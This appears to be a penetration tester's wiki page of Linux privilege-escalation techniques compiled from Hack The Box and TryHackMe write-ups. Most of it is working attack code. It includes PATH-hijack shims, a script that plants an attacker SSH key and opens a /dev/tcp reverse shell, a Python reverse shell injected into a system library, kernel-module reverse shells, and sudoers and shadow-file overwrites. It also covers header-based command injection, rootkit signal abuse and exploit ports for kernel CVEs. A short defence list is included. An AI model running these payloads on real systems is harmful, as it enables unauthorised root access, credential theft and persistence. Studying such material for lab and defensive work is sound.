# Check writable directories in PATH
echo $PATH

# If /tmp is in PATH, create a fake binary
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH
# Run the SUID binary that calls 'service' without absolute path
```

**Real HTB — sudo + script PATH hijack (Previse — Easy):**

The sudoers rule for `/opt/scripts/access_backup.sh` lacks `secure_path`, so the user's `PATH` is preserved into the root context. The script calls `gzip` (no absolute path), so prefix `PATH` with a directory that contains a malicious `gzip` shim:

```bash
cat > /dev/shm/gzip << 'EOF'
#!/bin/bash
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAA... attacker@kali" >> /root/.ssh/authorized_keys
bash -i >& /dev/tcp/10.10.14.6/443 0>&1
EOF
chmod +x /dev/shm/gzip
export PATH=/dev/shm:$PATH
sudo /opt/scripts/access_backup.sh
```

**Real HTB — sudo SETENV + fake `find` (Photobomb — Easy):**

The sudoers rule has `SETENV` set, which lets you pass `PATH=` on the command line even when `secure_path` is configured. The wrapped script calls `find` without an absolute path:

```bash
echo -e '#!/bin/bash\n\nbash' > find
chmod +x find
sudo PATH=$PWD:$PATH /opt/cleanup.sh
```

If `find` won't take, try the bare `[` builtin which scripts use for tests:

```bash
echo -e '#!/bin/bash\n\nbash' > '['
chmod +x '['
sudo PATH=$PWD:$PATH /opt/cleanup.sh
```

---

### Docker Group

> Beyond the host `docker` group: reachable runtime sockets, `runc`/`ctr` host mounts, sensitive host mounts, privileged-container and Kubernetes-node escapes are collected in [[linux-container-escape]].

Being in the `docker` group is equivalent to root.

```bash
# Check group membership
id

# Mount host filesystem via Docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

### LXD Group

```bash
# Check group membership
id | grep lxd

# LXD privesc — build Alpine image on attacker, transfer and import
# On attacker:
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder && sudo bash build-alpine
# Transfer the .tar.gz to target

# On target:
lxc image import ./alpine-v3.x-x86_64.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
# Now inside privileged container with host filesystem at /mnt/root
```

Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

---

### Python Library Hijacking

When a script runs as another user (e.g. via sudo or cron) and imports a Python library that the current user can write to:

```bash
# Find files owned by a target user's group
find / -group <target_group> -type f 2>/dev/null

# Check if a cron/sudo script imports a writable library
# e.g. /usr/lib/python3.8/shutil.py is writable by group 'death'
# and /home/morpheus/restore.py imports shutil and runs via cron as morpheus

# Inject a reverse shell at the top of shutil.py:
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<ATTACKER_IP>",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

---

### Stored Credentials

```bash
# Config files
cat /home/user/myvpn.ovpn
cat /etc/openvpn/auth.txt

# Bash history
cat ~/.bash_history | grep -i passw

# Web application configs (common locations)
cat /var/www/html/configuration.php
cat /var/www/html/wp-config.php
cat /var/www/html/config.php

# SSH keys
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
```

---

### CVE-2022-4510 — Binwalk Path Traversal (root-triggered)

`binwalk <= 2.3.2` PFS extractor has a path-traversal flaw; a crafted `.png` (or other binwalk-recognised file) can write arbitrary files when `binwalk -e` extracts it. Useful when a root cron / `inotifywait` watches a directory you can drop files into and runs `binwalk -e` on new arrivals.

**Real chain — Pilgrimage (Easy):**

```bash
# discover the root watchdog with pspy:
./pspy64
# UID=0 ... /usr/local/bin/malwarescan.sh
# malwarescan.sh: inotifywait -m -e create /var/www/.../shrunk/ | while read ...; do binwalk -e "$f"; done

# build payload (public exploit: CVE-2022-4510-WalkingPath):
python walkingpath.py ssh root.png ~/.ssh/id_ed25519.pub

# upload to the watched directory
scp binwalk_exploit.png emily@target:/var/www/pilgrimage.htb/shrunk/

# wait, then SSH as root:
ssh -i ~/.ssh/id_ed25519 root@target
```

---

## Bypasses and Variants

- **CVE-2019-14287 sudo `-u#-1`**: For `(ALL, !root)` sudoers entries on sudo < 1.8.28, `sudo -u#-1 BINARY` runs as UID 0. See `### CVE-2019-14287` section.
- **CVE-2022-4510 binwalk path traversal**: `binwalk -e` on a crafted file writes arbitrary paths; abuse when root runs `binwalk -e` on uploaded files. See section above.
- **Sudo `SETENV` flag**: Per-rule `SETENV` (in the sudoers `Cmnd_Spec`) lets the caller override env-keep, including normally-stripped `PYTHONPATH`, `PERL5LIB`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `XDG_CONFIG_HOME`. `sudo -l` shows it as `SETENV: /path/to/script`.
- **Wildcard cp/tar/rsync argument injection**: `touch -- --preserve=mode`, `touch -- --checkpoint-action=...`, `touch -- --rsh=sh` in a directory the script globs as `*`. See `### Sudo + Script Wildcard / Argument Injection`.
- **AppArmor profile bypass via shebang**: `usr.bin.perl` blocks `perl -e ...` but lets `./script.pl` execute (profile matches the interpreter path, not the script). See Nunchucks example under Capabilities.
- **AF_ALG page-cache write (CVE-2026-31431)**: see dedicated section above.
- **Fail2ban actionban injection**: If the user can run `fail2ban-client` with sudo, inject a command into `actionban` and trigger a ban.
- **Logrotate exploitation** (CVE-2016-1247): From www-data, use symlink attack on nginx log rotation to escalate.
- **SUID with SHELLOPTS (Bash < 4.4)**: `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'`

---

## Detection and Defence

- Audit SUID binaries regularly: `find / -perm -4000 -type f 2>/dev/null`
- Review sudoers file for `NOPASSWD` and wildcard rules
- Ensure cron scripts and their directories are not world-writable
- Monitor for unusual capability assignments (`getcap -r /`)
- Keep kernel patched; use tools like `linux-exploit-suggester` in internal assessments
- Restrict Docker group membership; use rootless Docker where possible
- Never enable `no_root_squash` in NFS exports
- Use read-only mounts for shared Python libraries in multi-user environments

## Tools

- LinPEAS — automated Linux privilege escalation enumeration
- LinEnum — enumeration script
- Linux Exploit Suggester — kernel CVE suggestions
- GTFOBins — SUID/sudo binary exploitation database

## Indirect command injection: root job over a user-controlled file

A root cron/script that reads a data file into an **unquoted** shell expansion is root RCE even
when neither the script nor the file is writable by you, as long as some process writes attacker
data into that file. Example (`/opt/log_checker.sh`, root cron):

```sh
while read ip; do
  /usr/bin/sh -c "echo $ip >> /root/logged";   # $ip unquoted -> command injection
done < /var/www/development/logged
```

The feeder was a web app logging `$_SERVER['HTTP_X_FORWARDED_FOR']` verbatim into that file, so the
injection source is an HTTP header:

```bash
curl http://127.0.0.1:8080/index.php -d 'username=a or a&password=x' \
  -H 'X-Forwarded-For: ;cp /bin/bash /tmp/rootbash;chmod 6755 /tmp/rootbash;'
# wait for the cron, then:
/tmp/rootbash -p        # euid=0
```

Find it with **pspy** (shows the periodic root `sh -c` with no cron-read access needed), then trace
what writes its input file. Any spot where root later `eval`/`sh -c`s a file or field that a
lower-priv process (web app, log, DB row) can influence is the same primitive. Fix: quote (`"$ip"`)
plus validate input.

## Sources

- THM Linux PrivEsc (linuxprivescarena room)
- THM Dreaming — Python library hijacking
- THM GamingServer — LXD privilege escalation
- 0xdf HTB writeups — 25 Easy/Medium Linux machines (Wave 4 ingest):
  - Sudo / GTFOBins: Traverxec (journalctl), Academy (composer), Knife (knife exec), CozyHosting (ssh ProxyCommand), Meta (neofetch + XDG_CONFIG_HOME), SneakyMailer (pip3), Previous (terraform dev_overrides), Admirer (PYTHONPATH via SETENV), Armageddon (snap install --devmode), Blunder (CVE-2019-14287), Photobomb (SETENV + PATH), Previse (PATH hijack on gzip)
  - Sudo + scripted misconfigs: PermX (setfacl symlink), Dynstr (`cp *` wildcard `--preserve=mode`)
  - Cron / writable / service: Epsilon (tar symlink+`-h` race), Slonik (pg_basebackup SUID drop), Inject (ansible-parallel `*.yml`), Spectra (Upstart writable conf)
  - Capabilities: Cap (`cap_setuid` python), Nunchucks (`cap_setuid` perl + AppArmor bypass), Faculty (`cap_sys_ptrace` gdb shellcode injection)
  - SUID: Mango (jjs Nashorn)
  - Group escapes: Tabby (LXD), Shoppy (Docker)
  - CVE-2022-4510 binwalk: Pilgrimage

## Backup-tool loot: borg / borgmatic repository -> host secrets

A root-run backup is an easy-to-miss privesc/loot lead. Enumerate NON-STANDARD installed tools
(`borg`, `borgmatic`, `restic`, `duplicity`, `rsnapshot`) - their presence in a web-app or container
image is a tell that a root backup of `/root` or `/etc` exists nearby.

- **Config leaks the repo passphrase in cleartext.** `borgmatic` stores it in
  `/etc/borgmatic/config.yaml` (or `~/.config/borgmatic/`) as `storage.encryption_passcommand`
  (e.g. `echo <passphrase>`) or `encryption_passphrase`. The config also names the repo
  (`repositories:`) and what is backed up (`source_directories:`, often `/root`).
- **Old archives hold secrets removed from the live FS.** List and read history:
```bash
export BORG_PASSPHRASE='<from the config>'
borg list /path/to/repo                     # archive names (dated)
borg list /path/to/repo::<archive> | grep -iE 'id_(rsa|ed25519|ecdsa)|\.pem|authorized_keys'
borg extract /path/to/repo::<oldest-archive> root/.ssh   # extract only what you need
```
  A root SSH private key present in an OLDER archive but deleted from the current `~/.ssh` is the
  classic find. If host SSH is **publickey-only** (password auth disabled), that recovered key is
  the intended way in: `ssh -i <recovered_key> root@<host>`.
- **Container -> host escape:** the same trick escapes a container when the repo (or the borgmatic
  config) is reachable inside it and the key logs into the HOST's sshd - it beats a hardened-container
  kernel/cgroup escape, so check for the backup FIRST. See [[docker-attacks]].

<!-- promoted-slug: borg-backup-loot-privesc -->

### CVE-2026-31431 copyfail on a Python 3.8 target (os.splice port)

The public copyfail PoCs call `os.splice`, added in **Python 3.10**. On a 3.8 target (very common:
Ubuntu 20.04 ships `/usr/bin/python3` = 3.8) the stock exploit dies with
`AttributeError: module 'os' has no attribute 'splice'`. Port the two splice calls to a direct
syscall via ctypes (x86_64 `__NR_splice = 275`); everything else (AF_ALG bind, `sendmsg`, `recv`)
is stdlib-portable:

```python
import ctypes, os
_libc = ctypes.CDLL(None, use_errno=True); _libc.syscall.restype = ctypes.c_long
def _splice(fd_in, off_in, fd_out, off_out, length, flags=0):
    # off_in/off_out: None -> NULL, else ctypes.byref(ctypes.c_longlong(offset))
    r = _libc.syscall(ctypes.c_long(275), ctypes.c_int(fd_in), off_in,
                      ctypes.c_int(fd_out), off_out, ctypes.c_size_t(length), ctypes.c_uint(flags))
    if r < 0:
        e = ctypes.get_errno(); raise OSError(e, os.strerror(e))
    return r
# os.splice(file_fd, write_end, n, offset_src=0)  ->  _splice(file_fd, ctypes.byref(ctypes.c_longlong(0)), write_end, None, n)
# os.splice(read_end, sock_fd, n)                 ->  _splice(read_end, None, sock_fd, None, n)
```

Verify the precondition before firing (the algif_aead AEAD must instantiate on the target kernel):
```bash
python3 -c 'import socket; socket.socket(38,socket.SOCK_SEQPACKET).bind(("aead","authencesn(hmac(sha256),cbc(aes))"))'  # no error = reachable
```
`os.splice` unavailability is a Python-version issue, not a "not vulnerable" signal - port and re-run.

<!-- promoted-slug: copyfail-py38-splice -->

---

## Capability enumeration and the empty-capability SUID trick

The specific-capability examples above skip the enumeration methodology and the CapEff bitmask decode, which is how you actually triage capability privesc on a live box. Per-process caps live in `/proc/<pid>/status` (five sets: CapInh, CapPrm, CapEff, CapBnd, CapAmb); file caps live in extended attributes.

```bash
# Decode a process capability bitmask to names
grep Cap /proc/self/status
capsh --decode=0000003fffffffff        # a full-root mask
getpcaps <pid>                          # caps of a running process by PID
getcap -r / 2>/dev/null                 # file caps across the FS
```

The `+ep` / `+eip` / `=ep` suffix matters: `e`=effective, `p`=permitted, `i`=inheritable. A subtle but real primitive: a binary with an EMPTY capability set (`getcap x` shows `x =ep`) that is not root-owned and has no SUID bit will still run with euid 0, because an empty file-cap set with the effective flag forces uid 0 on exec. Flag any `=ep` binary as a root-exec path even without SUID.

---

## CAP_SYS_MODULE: load a malicious kernel module

`cap_sys_module` on any binary (commonly a scripting interpreter, or on `/bin/kmod` itself) lets you insert a kernel module, which is game over: the module runs in kernel context and can spawn a root shell via `call_usermodehelper`. Build a tiny LKM off-target and `insmod` it.

```c
// reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
static char *argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/ATTACKER/4444 0>&1", NULL};
static char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
static int __init x(void){ return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC); }
static void __exit y(void){}
module_init(x); module_exit(y);
```

```makefile
# Makefile (indent MUST be a tab)
obj-m += reverse-shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
```

```bash
make                       # compile against the target kernel headers
nc -lvnp 4444 &            # on attacker
insmod reverse-shell.ko    # binary with cap_sys_module; or via python kmod / modprobe
```

If only a scripting binary carries the cap, fake `/lib/modules/$(uname -r)/` in a writable dir and load with python `kmod`. Detect with `getcap -r / 2>/dev/null | grep sys_module` and `capsh --print | grep sys_module` inside a container (this is also a classic container breakout when SYS_MODULE is in the container's cap set; see [[linux-container-escape]]).

---

## CAP_SYS_ADMIN: bind-mount a fake /etc/passwd (and mount the host disk in containers)

`cap_sys_admin` is near-root because it grants `mount(2)`. On a bare host with a SYS_ADMIN-capable binary you can bind-mount an attacker-crafted passwd file over the real one, then `su` with a known password.

```python
# python binary with cap_sys_admin+ep
from ctypes import CDLL, c_char_p, c_ulong
libc = CDLL("libc.so.6")
MS_BIND = 4096
libc.mount(b"/tmp/fake_passwd", b"/etc/passwd", b"none", MS_BIND, b"rw")
# /tmp/fake_passwd = copy of /etc/passwd with root's hash replaced (openssl passwd -1)
```

In a container that holds SYS_ADMIN, the same cap lets you mount the host block device directly and chroot in (see also [[linux-container-escape]]):

```bash
capsh --print | grep sys_admin
fdisk -l                    # find host disk, e.g. /dev/sda
mount /dev/sda /mnt && chroot /mnt bash
```

---

## CAP_CHOWN / CAP_FOWNER / CAP_DAC_OVERRIDE: seize /etc/shadow

The examples above cover `cap_dac_read_search` (read any file) but not the write-side caps. Each of these, on a scripting binary, yields root without touching disk permissions the normal way:

```bash
# cap_chown: chown /etc/shadow to yourself, then edit it
python3 -c 'import os; os.chown("/etc/shadow", os.getuid(), os.getgid())'

# cap_fowner: bypass permission checks that require being the file owner (e.g. chmod any file)
# cap_dac_override: bypass ALL write-permission checks, write any file directly
python3 -c 'open("/etc/sudoers","a").write("\nyouruser ALL=(ALL) NOPASSWD:ALL\n")'
ruby -e 'require "fileutils"; FileUtils.chown(Process.uid, Process.gid, "/etc/shadow")'
```

`cap_dac_override` is the strongest of the three: append a NOPASSWD sudoers line, add a UID-0 user to `/etc/passwd`, or drop an SSH key into `/root/.ssh/`.

---

## ld.so.conf / ldconfig library hijack (works against SUID binaries)

Distinct from LD_PRELOAD: SUID/secure-execution binaries IGNORE `LD_PRELOAD` and `LD_LIBRARY_PATH`, but they STILL trust directories listed in `/etc/ld.so.conf` and `/etc/ld.so.conf.d/*.conf`. So write access to any of those config files (or to a directory they reference), or `sudo` over `ldconfig`, is a hijack of the very libs a root/SUID binary loads.

```bash
# Triage: which lib does the target need, and where is it resolving from?
readelf -d ./target | grep NEEDED
LD_DEBUG=libs ./target 2>&1 | grep -E 'find library|trying file'
ldconfig -p | grep <libname>
```

Case A, writable ld.so.conf.d entry: point the loader at a writable dir, drop a malicious lib with the same soname, wait for root/ldconfig.

```bash
echo "/home/me/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf   # or you already have write here
# build malicious lib exporting the same symbol the binary calls
cat > /home/me/lib/libcustom.c <<'EOF'
#include <stdlib.h>
void vuln_func(void){ setuid(0); setgid(0);
  system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash"); }
EOF
gcc -shared -fPIC -Wl,-soname,libcustom.so -o /home/me/lib/libcustom.so /home/me/lib/libcustom.c
# after ldconfig/reboot, once the SUID/root binary runs:  /tmp/rootbash -p
```

Case B, `sudo ldconfig`: you control which conf to load, so include a dir you own.

```bash
cd /tmp; mkdir -p conf; echo "include /tmp/conf/*" > fake.conf; echo "/tmp" > conf/evil.conf
# place malicious libcustom.so in /tmp
sudo ldconfig -f /tmp/fake.conf
```

Gotcha: `sudo echo x > /etc/ld.so.conf.d/y.conf` fails (shell does the redirect as you); use `... | sudo tee`.

---

## polkit / pkexec via a privileged group

Separate from the PwnKit CVE (already in [[privesc-exploit-arsenal]]): if `pkexec` is SUID and you are in a group listed in the polkit local-authority config (often `sudo` or `admin` by default on some distros), you can run commands as root through polkit even with no sudoers entry.

```bash
find / -perm -4000 2>/dev/null | grep pkexec
cat /etc/polkit-1/localauthority.conf.d/*     # which groups may use pkexec
pkexec /bin/sh                                # prompts for YOUR password
```

Over SSH with no GUI, `pkexec` returns "No session for cookie". Work around it with two SSH sessions and `pkttyagent`:

```bash
# session 1:
echo $$                     # note PID, then run:
pkexec /bin/bash
# session 2:
pkttyagent --process <PID_from_session1>   # authenticate here; session 1 becomes root
```

---

## Interesting group memberships (disk, shadow, adm, staff, video, backup)

`id` group membership is a fast win the checklist names but does not exploit. Concrete primitives:

| Group | Primitive |
|-------|-----------|
| `disk` | Near-root: raw block-device access. `debugfs /dev/sda1` then `cat /root/.ssh/id_rsa` / `cat /etc/shadow`; `debugfs -w` can also write. |
| `shadow` | Read `/etc/shadow` directly, then crack (`!hash` = locked, `*` = no hash set). |
| `staff` | Write `/usr/local/*` which is early in root's PATH. Drop a `/usr/local/bin/run-parts` shim; it fires on cron.hourly and on every SSH login (MOTD), then `/bin/bash -p`. |
| `video` | Read the framebuffer: `cat /dev/fb0 > screen.raw` + resolution from `/sys/class/graphics/fb0/virtual_size`, open as raw in GIMP to see the console. |
| `adm` | Read `/var/log/*` for creds/tokens in logs. |
| `root` (secondary) | Enumerate what it can write: `find / -group root -perm -g=w 2>/dev/null` (service configs, libs). |
| `backup` / `operator` / `lp` / `mail` | Credential-discovery vectors: archives, spools, mail (reset links/OTPs). Pivot via password/token reuse. |

```bash
# disk group -> read root's key without being root
debugfs /dev/sda1
debugfs:  cat /root/.ssh/id_rsa

# staff group -> run-parts PATH hijack
printf '#!/bin/bash\nchmod 4777 /bin/bash\n' > /usr/local/bin/run-parts
chmod +x /usr/local/bin/run-parts   # trigger by opening a new SSH session, then: /bin/bash -p
```

---

## Writable UNIX socket / systemd socket command injection

A root process may listen on a UNIX socket and execute what it receives (directly, or via a systemd `.socket` unit that activates a root service). If the socket is world-writable, send it a command.

```bash
# find writable sockets and their owners
netstat -a -p --unix 2>/dev/null | grep -i listen
find / -type s 2>/dev/null
ss -xlp

# if a root-owned socket pipes input to a shell:
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" | socat - UNIX-CLIENT:/tmp/socket_test.s
/tmp/bash -p
```

Also check writable systemd socket units and the service they activate:

```bash
find / -name '*.socket' -writable 2>/dev/null
# edit ListenStream / the paired .service ExecStart, then: systemctl daemon-reload; trigger the socket
```

Some root daemons bind privileged actions to client-supplied thread IDs + signals (LG webOS class); if the protocol lets an unprivileged client pick the target TID, a crafted request + signal can trip the privileged path. Harden by enforcing SO_PEERCRED on the socket.

Related: [[linux-dbus-privesc]] applies the same IPC-to-root idea to D-Bus system-bus services.

---

## SSH agent hijacking (SSH_AUTH_SOCK)

If `ForwardAgent yes` is set (in `/etc/ssh/ssh_config` or a user's `~/.ssh/config`) and you are root (or the agent's owner), you can reuse a live agent socket left in `/tmp` or `/run/user/*` to authenticate as that user to any host their key unlocks, without ever reading the private key (it stays in agent memory).

```bash
# hunt for agent sockets
ls -la /run/user/*/ssh-* /tmp/ssh-* 2>/dev/null
find /run/user /tmp -type s -name 'agent.*' 2>/dev/null

# impersonate the socket's owner
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.NNNN ssh -o IdentitiesOnly=no user@nexthost
```

## Wildcard / argv injection deep tier: tcpdump -z RCE, 7z @listfile, bsdtar, scp/git

Beyond the `tar --checkpoint-action`, `chown --reference`, and `zip -TT` primitives already covered in the **Sudo + Script Wildcard / Argument Injection** section above, these argv-injection variants keep appearing in appliance wrappers, "download as archive" web features, and over-loose sudoers rules. Payloads are created as filenames in a directory that a privileged job later globs as `*`.

tcpdump is the biggest addition. Its rotation flags chain into arbitrary command execution: `-G` (time rotate) + `-W 1` (one file) + `-z <cmd>` (post-rotate hook) runs `<cmd>` as the tcpdump user (often root on appliances) the moment one matching packet forces a rotate.

```bash
# wrapper concatenates a user-controlled "file name" field into tcpdump argv:
/debug/tcpdump --filter="udp port 1234" --file-name="x -i any -W 1 -G 1 -z /mnt/usb/rce.sh"
# then send one matching packet to trigger the rotate -> rce.sh runs as root
```

Loose sudoers `tcpdump` rules (constraining only the first `-w`) give arbitrary root-owned write and file read, because tcpdump accepts multiple `-w` (last wins), plus `-Z`, `-r`, `-V`:

```bash
sudo tcpdump -c10 -w/allowed/a/ -Z root -w /etc/sudoers.d/1 -r payload.pcap -F /allowed/filter.<GUID>  # write root file from a crafted pcap
sudo tcpdump -c10 -w/allowed/a/ -V /root/root.txt -w /tmp/x -F /allowed/filter.<GUID>                  # -V leaks file contents via error diagnostics
```

7-Zip survives a defensive `-- *` because it treats a filename beginning with `@` as a file-LIST; symlink it at a secret and 7z prints the target to stderr while failing:

```bash
ln -s /etc/shadow root.txt; touch @root.txt      # then root's:  7za a out.7z -t7z -snl -- *  leaks /etc/shadow
```

Others: bsdtar/macOS has no `--checkpoint` but `--use-compress-program=/bin/sh` (and `--newer-mtime=@<file>` to read a file); `rsync` `-e sh shell.sh` or `--rsync-path`; `scp -S <cmd>`; `git -c core.sshCommand=<cmd>`; `flock -c <cmd>`. Triage with pspy to watch real argv during cron/systemd and grep sudoers.

```bash
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'
rg -n '(tar|bsdtar|rsync|zip|7z|chown|chmod|tcpdump).*(\*|\$@|\$\*)' /etc /opt /usr/local /srv 2>/dev/null
```

## euid/ruid/suid semantics: why SUID shells drop privileges and how bash -p keeps them

A recurring reason a SUID-root exploit "works but gives no root shell" is the difference between real/effective/saved UID. `ruid` is who launched the process; `euid` is what the kernel checks for privilege (equals the file owner after a SUID exec); `suid` is the saved copy that lets a privileged process temporarily drop and reclaim. A non-root process may only set its `euid` to one of its current `ruid`/`euid`/`suid`.

The trap: `bash` (and `sh`) reset `euid` down to `ruid` on startup unless invoked with `-p`. So a SUID binary that calls `system("...")` (which runs `/bin/sh -c`) or execs bash without `-p` loses the elevated `euid` and you land back as the unprivileged user. Two fixes:

```c
setuid(0);                 // aligns ruid=euid=suid=0 first (needs the process to be able to)
execl("/bin/bash","bash","-p",NULL);   // -p preserves the elevated euid instead of dropping to ruid
```

- If you fully control the SUID C program: call `setresuid(0,0,0)` / `setuid(0)` BEFORE spawning the shell so all three IDs are root, then a plain shell keeps root.
- If you only trigger a shell from a SUID binary you do not control: always request `bash -p` (or a static shell) so `euid` is not reset. `setreuid(x,x)`/`setresuid` that equalize `ruid` and `euid` also make a subsequent bash keep the identity.

Quick check of the three IDs at runtime: `id` shows `uid`(ruid) and `euid` separately when they differ; `cat /proc/self/status | grep -E '^(Uid|Gid)'` prints real/effective/saved/fs in order.

## Kernel LPE via ptrace exit-race + pidfd_getfd FD theft (CVE-2026-46333) and the YAMA gate

A modern, reusable kernel-privesc shape: turn a ptrace-authorization bug into stealing an already-open, already-authorized file descriptor from a privileged process, instead of exploiting the helper's own logic. `pidfd_getfd()` duplicates an fd from another process after a ptrace-style permission check; if that check is wrongly granted during a teardown window (process exiting or dropping creds), an unprivileged attacker copies the fd and the kernel then enforces operations on the STOLEN fd, not on the pathname or a fresh auth flow.

```c
int p = pidfd_open(victim_pid, 0);
int stolen = pidfd_getfd(p, victim_fd, 0);   // race while victim is exiting / dropping privileges
/* read() /etc/shadow or /etc/ssh/*_key from a root-opened fd, or drive a stolen authenticated D-Bus/systemd channel to get root-side actions */
```

Good targets are setuid/file-cap binaries and root daemons that briefly hold something valuable: an open `/etc/shadow` or SSH host key, or an authenticated system-bus connection (password/account helpers, SSH helpers, PolicyKit/D-Bus mediated helpers). The exploit needs only a ptrace relationship (e.g. being the parent of a spawned privileged child under permissive YAMA), not a bug in the helper.

`kernel.yama.ptrace_scope` is the practical gate and is worth checking on any target for this whole ptrace-abuse family: `0` = classic same-UID; `1` = parent->child allowed (keeps many public exploits reachable); `2` = needs `CAP_SYS_PTRACE`, breaks the unprivileged `pidfd_getfd()` path with `-EPERM`; `3` = ptrace attach disabled until reboot.

```bash
cat /proc/sys/kernel/yama/ptrace_scope
```

## Firefox saved credentials -> password-reuse privesc

A readable Firefox profile (same user, or a world-readable/misplaced `.firefox`/`.mozilla` dir) lets
you recover stored logins offline; these are frequently REUSED for a higher-priv local account, SSH,
or doas. You need BOTH files from the profile dir (`~/.mozilla/firefox/<rand>.default*` or a custom
path):

```bash
#   key4.db      (master key)
#   logins.json  (encrypted logins)
python3 firefox_decrypt.py <profile_dir>   # github.com/unode/firefox_decrypt -> plaintext user:pass
```

Then reuse the recovered password: `su <user>`, SSH, or `doas`. Enumerate for readable profiles:
`find / -name key4.db 2>/dev/null` and `find / -name logins.json 2>/dev/null`.

## doas privilege escalation

`doas` (OpenBSD's sudo alternative, often built from source on Linux) reads its config from
`/etc/doas.conf` OR `/usr/local/etc/doas.conf` - source builds default to the latter, so **check both**.
A rule `permit <user> as root` lets that user run any command as root (prompting for the invoking
user's password unless `nopass` is set). If you can BECOME that user (a recovered credential, a SUID,
group abuse), doas is a direct root path:

```bash
ls -l "$(which doas)"                              # SUID root binary present?
cat /usr/local/etc/doas.conf /etc/doas.conf 2>/dev/null   # who is permitted, as whom, nopass?
doas /bin/bash                                     # -> root (enter that user's password)
```

<!-- promoted-slug: firefox-creds-doas-privesc -->

## CAP_SYS_MODULE escape when kernel headers do not match the running kernel

A container or host with `cap_sys_module` (`capsh --print | grep sys_module`) lets you `insmod` a module
into the HOST kernel: `call_usermodehelper()` inside `init_module` runs a command in the host init
namespace as root (container breakout / privesc). The common blocker is that the installed kernel headers
do not match the RUNNING kernel (e.g. `/usr/src/linux-headers-6.8.0-1030` present but `uname -r` =
`6.8.0-1031`), so `insmod` rejects the module on a vermagic mismatch.

Fix: build against the closest available headers, then binary-patch the `vermagic` string in the `.ko` to
the running `uname -r` (same byte length, so a straight `sed` is safe), then load:
```bash
cat > revshell.c <<'EOF'
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
static int __init x(void){ char *a[]={"/bin/bash","-c","bash -i >& /dev/tcp/LHOST/PORT 0>&1",NULL};
 static char *e[]={"PATH=/sbin:/bin:/usr/sbin:/usr/bin",NULL}; return call_usermodehelper(a[0],a,e,UMH_WAIT_EXEC);}
static void __exit y(void){} module_init(x); module_exit(y);
EOF
printf 'obj-m += revshell.o\nKDIR := /usr/src/linux-headers-<AVAILABLE>\nall:\n\tmake -C $(KDIR) M=$(PWD) modules\n' > Makefile
make
sed -i 's/<AVAILABLE>/<RUNNING>/g' revshell.ko    # patch vermagic to the RUNNING uname -r (equal length)
insmod revshell.ko
```
The reverse shell fires in the HOST context = host root. Point it at a listener the target can reach
(e.g. the docker gateway / a container you already own on the same bridge). If only a scripting binary
carries the cap (not full root), fake `/lib/modules/$(uname -r)/` in a writable dir and load via python
`kmod` instead. See [[linux-container-escape]].

<!-- promoted-slug: cap-sys-module-vermagic -->

## sudo insmod / pre-loaded LKM rootkit -> root

Distinct from `CAP_SYS_MODULE` above (there you build and load your OWN module). Here the module
is FIXED - a pre-built LKM rootkit left on the box - and you are handed the right to load it:

```bash
sudo -l
# (root) NOPASSWD: /usr/sbin/insmod /path/to/rootkit.ko
```

The allowed `.ko` is almost always a public rootkit (m0nad **Diamorphine** is the common one -
`modinfo rootkit.ko` shows `author: m0nad`, `description: LKM rootkit`). Loading it as root installs
syscall hooks; you then escalate by sending its **give-root magic signal** to your own process:

```bash
sudo /usr/sbin/insmod /path/to/rootkit.ko   # exact sudoers-allowed path, no extra args (or it won't match)
kill -64 0                                   # Diamorphine default SIGSUPER -> current process becomes root
id                                           # uid=0(root)
```

Diamorphine default signals: `-64` = give root (SIGSUPER), `-63` = hide/unhide a PID, `-31` = hide/
unhide the module.

**Two gotchas that waste time:**

- **The magic signal may be recompiled.** A box author can change `SIGSUPER` (seen in the wild:
  57 instead of 64), and the default then silently does nothing. Don't guess from memory - the module
  is usually NOT stripped, so read the real constant out of it:
  ```bash
  objdump -d rootkit.ko | sed -n '/<hacked_kill>:/,/<module_hide>:/p' | grep cmp
  # cmp $0x1f (31, hide module) ; cmp $0x3f (63, hide proc) ; cmp $0x39 (57) -> branch that calls give_root
  ```
  The `cmp $0xNN` whose branch calls `give_root` is the real signal (0x39 = 57, 0x40 = 64).

- **A wrong (unhandled) signal number kills your shell.** `kill -<sig> 0` targets the whole process
  group. The rootkit only swallows the signals it HANDLES (returns 0, no delivery); an UNHANDLED
  number falls through to real delivery and terminates your process group - dropping an SSH session.
  The correct magic signal is safe; a wrong one both fails to elevate AND disconnects you. If you must
  probe, send to a throwaway target and ignore the signal first (`signal(sig, SIG_IGN)` in a small C
  helper) so a stray real delivery can't kill you.

Contrast with [[linux-rootkits]] (the same modules used post-root for persistence/evasion); here the
rootkit is repurposed as the privesc primitive itself.

<!-- promoted-slug: sudo-insmod-lkm-rootkit -->

## Related: app-specific Linux privesc

